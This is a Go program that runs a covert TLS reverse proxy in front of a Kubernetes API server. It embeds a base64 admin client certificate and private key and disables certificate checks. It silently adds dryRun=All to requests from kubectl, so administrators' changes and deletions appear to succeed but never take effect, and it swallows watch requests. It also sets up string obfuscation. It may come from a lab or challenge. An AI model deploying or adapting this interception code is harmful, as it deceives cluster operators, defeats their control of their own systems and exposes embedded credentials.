//go:build ignore
// +build ignore

//go:generate strobfus -filename $GOFILE

package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

var KUBERNETES_CLIENT_CERT = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJVENDQWdtZ0F3SUJBZ0lJWnRUSTRYQW9FVzR3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TWpBNE1EZ3hNRE16TURaYUZ3MHlNekE0TURneE1ETXpNVEJhTURReApGekFWQmdOVkJBb1REbk41YzNSbGJUcHRZWE4wWlhKek1Sa3dGd1lEVlFRREV4QnJkV0psY201bGRHVnpMV0ZrCmJXbHVNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXhBdjJtODdpRWp6TElmYnEKV1h4WEJMVWdhNHBQckw0d0dvckJRVVZod1NqVGtvWGZQREVoNGdxSWEyUmZuWG41ank3NU9PdE50Sk9tRVQyMwpDdGFlalBGakRNejBFZ214em9WYW82SUY5c294aTdHOW5DU3NoeTk0SXNnQXhsMCtmZmNCZFo4UHlpU3hnbTBRCmNTWjFuSTRjMkJFUmhsc2FIL2d4VGVZY0ZPWnl4M0lnSUNKcms3Yld5dUtSNnlhRXpYRUszTWM4eG1QUjQrYU0KNHBKbGdJNU5FQTl1MElZbGFXNXhlcExqeUFtT21Ca0t5OVJWcTViYjVyV1ZwZTlRR2lQWnlJWWR6eHFyeStGSgoyMzcvUWxYRGFZT0Z4QVhiRHgrU3RkZDBWeWNycUJFUldhRFZrMHRCM0QxVVQ4OXhxQTY3VVovVDNIZytoL3ZsCmpSdi91UUlEQVFBQm8xWXdWREFPQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0RBWURWUjBUQVFIL0JBSXdBREFmQmdOVkhTTUVHREFXZ0JTZlhDNW55a0I0dTFWQmVIa1dCazdkaEx1RQo5akFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBUXhqV24rbEVSU1Z4SjQzZGVYN2VrNWxJZDZUNE5PRWd2U3hkCjhCdUNrWndURWVCVDYvZWlDUzkvQ3RTa2hCSXRVYzhNT0pJM1hlQTMzZk5wNjlad0s1bmprcTNHbGgrWEF5S1QKTjN0UEdOQ3VEeFN6YjlESnJtak5hUHpqU2treXRrY3J1cHlZMEZjWFN4ZUI5VmhKNnpTakZ6c0FiWFdIZVhFdwpEYVhZTjVRdGpYQVM3RytMOFY4blNqL0oyM0lpdG5OeVNzK00yS0dRTkZ6TTRrcmMrREZVQzBBZ2tSMDcwc1NpCmxoaHNnVGgySVlDNnBPcFJvRE5zSW1uc3JUWGt1Sm1aUkdCSjJ4WFJGQTI3bnU3Mlg0UU4xU3Qzb2tHRUhGb2YKZFptbzY5Q3IyZTQvOFgrRnFYSCtPUFp1WERvdGRuMmtVZ29Lb3hnYWdiMyt3dE9MWEE9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg=="
var KUBERNETES_CLIENT_KEY = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBeEF2Mm04N2lFanpMSWZicVdYeFhCTFVnYTRwUHJMNHdHb3JCUVVWaHdTalRrb1hmClBERWg0Z3FJYTJSZm5YbjVqeTc1T090TnRKT21FVDIzQ3RhZWpQRmpETXowRWdteHpvVmFvNklGOXNveGk3RzkKbkNTc2h5OTRJc2dBeGwwK2ZmY0JkWjhQeWlTeGdtMFFjU1oxbkk0YzJCRVJobHNhSC9neFRlWWNGT1p5eDNJZwpJQ0pyazdiV3l1S1I2eWFFelhFSzNNYzh4bVBSNCthTTRwSmxnSTVORUE5dTBJWWxhVzV4ZXBManlBbU9tQmtLCnk5UlZxNWJiNXJXVnBlOVFHaVBaeUlZZHp4cXJ5K0ZKMjM3L1FsWERhWU9GeEFYYkR4K1N0ZGQwVnljcnFCRVIKV2FEVmswdEIzRDFVVDg5eHFBNjdVWi9UM0hnK2gvdmxqUnYvdVFJREFRQUJBb0lCQUR4ZWhya2g4dUcwME1TTAp1VXlIQ25ETHFja1QxVWNYWmM2MmpaNGcxR0pieFJMb29INXpqc0NCaDlLeUhQTnNQUm9IVi8xY0VCaWNJdFpLClQ5UkpsSmRJT2IwV1c4NDJLQWUxYnR6V3BzbUJKOUtoa0FiR0VFNnNvbXpyYzdtaHV2MmxFMUQ2QXkyM01PWTkKMllOT1dZYzFCOUxOSnIxZHptU3IwOXJ1RWhXbyt3OVNKSW4xTzZoZnRWQk9nZmR2RDNuQlhtc1p4cWhhVmE5awo1ODBaQTNUZ0NNbmtXU1Z5aVBzdnlnd0JnVDRYdUdFU0RTZWFTR2F2WmJRbXdOeDVDR2tUL204OVFCb0RnMkljCk9hSURtNEI3V3FUeVVwaTJQcHRIbVVWYXNod29zYUdRRlpBdmp3Q01mb1VuYzVyYkllUlV5eUVyRkhFOURybloKVHFkWExRVUNnWUVBM0VsRzFTK2hRVDBzVVl3VzF4TzA2MXZxajFjR1VYRmxWWTdNYXZkRGtrb3dZV3JSMnRNVwptM1IySWxxUUtsd2F6b3ZVbTE4VWlqS1NtaDhVbkJsMExjZU85dGZTaGxZbkdUV3ZwcDQrTG05QVVVeEVkUk1rCjBSUU1tYVlyTVpGVU4rUnlXai9ya2lEZVU0Vm1zM09mZEc1MWQ5M3BhMHRGKzFqVzI3cHorQzhDZ1lFQTQ5U24KZTR4Qm5nNnpQbkx5YW83RkdESkE1dWpQVWUyaW16WXVSaXhsNUhQMXdQK3ZMRzQ4alRoMVI5dm8xS1l1KzJlVgpKZmdkcll4NmNLVUh6UVZWajk3Y3NONXAyU3B2V1lpUDhWT0p2SU93WGxXT2JmbzZGY1YydjJoWHhZSWM2Tm9EClVlZzc5eGZwQ3Npcy9HU0JoU2RaUXNSNS9tblQ3RTN1WlplU0pKY0NnWUVBdU14VU90WDVQbVNXUUZiNGRqZlgKQjdjVllHaU9LVmFxdndyTG5GU1FnREh5d2xhOWRBaXZwM3djK3BiazZGUmFQTG43Z3RoUnY5bkxPTFlvTVFmOQplY1kydmdleVdmWCtXTnk3M1ZoVks5a3lxTUVGa1AyZFhqU21tV05ZU3YzekcreHVyaDEvZnhoSnl1RlhsZVhDCmVBZU9UaCtCQ1B5ZDJjemVlbmpCZndzQ2dZRUFuTjAyNzQ3VFF3TTJFS0pPSEdYdWVFbHBmRk1CSTVTdFo1WjMKWitON3lENjdEMFk4RXloWFVwaHp6NlV1K3ZMczJEWXFiL2tVWGdDaDhOci9zdjZnT2EybFg3WFRSUzI5ZXZUVwp2cjdZejg0UDZmT1lYRXAwSWJkU21sazZUWWZYWmM5dGg4Q1JRUURhZUkxUTVYcEIzeThIZXp3U0RzUklvS1BMCnAzRWpzME1DZ1lBWkgxTDNUT3Z2RmFCU2ZJREdyVjNjdG1Yb2Y0ZU1qaEZrTTlsSVBnQlltZjE2VThObDhHMlQKVlUva29kWEhRR1FHNVhtcDF0LzRzMFJtbld2cVlrenBsL3VKWEhncHViTXh3Y2V6dnhqem42cFlZZFdPY0pRNwptR1F1UkU4K1VQRmZFSVBaSjA3ekMzOHRKa0E2NlkzL3dCOS84UkQ2WkFtc1p6MnlteHA5b1E9PQotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo="

func main() {
	debug := os.Getenv("DEBUG")

	userAgent := os.Getenv("INTERCEPT_USERAGENT")
	if len(userAgent) == 0 {
		userAgent = "kubectl/"
	}

	cert, err := base64.StdEncoding.DecodeString(KUBERNETES_CLIENT_CERT)
	if err != nil {
		log.Fatal("DecodeString:cert", err)
	}

	key, err := base64.StdEncoding.DecodeString(KUBERNETES_CLIENT_KEY)
	if err != nil {
		log.Fatal("DecodeString:key", err)
	}

	tlsCert, err := tls.X509KeyPair(cert, key)
	if err != nil {
		log.Fatal("X509KeyPair", err)
	}

	reverseProxy := http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {
		req.Host = "127.0.0.53"
		req.URL.Host = "127.0.0.53:6443"
		req.URL.Scheme = "https"
		req.Header.Set("Accept-Encoding", "")

		if strings.HasPrefix(req.Header.Get("User-Agent"), userAgent) {
			if req.Method == "DELETE" {
				postBody := "{\"propagationPolicy\":\"Background\",\"dryRun\":[\"All\"]}\n"
				req.Body = ioutil.NopCloser(strings.NewReader(postBody))
				req.ContentLength = int64(len(postBody))
			} else {
				req.URL.Query().Set("dryRun", "All")
				req.URL.RawQuery = req.URL.RawQuery + "&dryRun=All"

				req.URL.Query().Del("watch")
				req.URL.RawQuery = strings.Replace(req.URL.RawQuery, "watch=true", "", 1)

				req.URL.RawQuery = strings.Replace(req.URL.RawQuery, "&&", "&", 1)
			}
		}

		if debug == "1" {
			fmt.Printf("[reverse proxy server] [%s] %s %s -> %s\n", req.Header.Get("User-Agent"), req.Method, req.RequestURI, req.URL.RequestURI())
		}

		if strings.Contains(req.RequestURI, "watch=true") {
			rw.WriteHeader(http.StatusOK)
			return
		}

		req.RequestURI = ""

		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true, Certificates: []tls.Certificate{tlsCert}}

		// send a request to the origin server
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			rw.WriteHeader(http.StatusInternalServerError)
			_, _ = fmt.Fprint(rw, err)
			return
		}

		if strings.HasPrefix(req.Header.Get("Accept"), "application/json") {
			rw.Header().Set("Content-Type", "application/json")
		} else {
			rw.Header().Set("Content-Type", "application/octet-stream")
		}

		defer resp.Body.Close()
		reader := bufio.NewReader(resp.Body)

		if _, err := io.Copy(rw, reader); err != nil {
			log.Print("copy error", err)
		}
	})

	log.Fatal(http.ListenAndServeTLS(":853", "/etc/kubernetes/pki/apiserver.crt", "/etc/kubernetes/pki/apiserver.key", reverseProxy))
}
